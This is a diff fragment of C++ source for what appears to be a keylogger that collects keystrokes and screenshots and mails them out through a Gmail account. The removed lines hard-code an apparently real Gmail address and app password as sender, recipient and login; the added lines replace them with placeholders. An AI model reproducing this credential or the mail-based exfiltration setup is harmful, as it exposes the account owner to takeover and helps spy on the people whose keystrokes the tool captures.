@@ -196,10 +196,10 @@ private:
         return (bool)(eHook == NULL);
     }
 
-    std::string _FROM = "landilogan3@gmail.com";
-    std::string _TO = "landilogan3@gmail.com"; // because mails will be sent from your email to your email. so both from and to will be same 
-    std::string username = "landilogan3@gmail.com"; // required to login
-    std::string _PASSWORD = "ukbrxeaczzzkunnk"; //Generated app password from Gmail's security settings
+    std::string _FROM = "yourgmailid@gmail.com";
+    std::string _TO = "yourgmailid@gmail.com"; // because mails will be sent from your email to your email. so both from and to will be same 
+    std::string username = "yourgmailid@gmail.com"; // required to login
+    std::string _PASSWORD = "your_app_password"; //Generated app password from Gmail's security settings
     std::string keyLogsAll = "";
     vector<std::string> imgFileNames;
     char currDir[MAX_PATH] = { 0 };
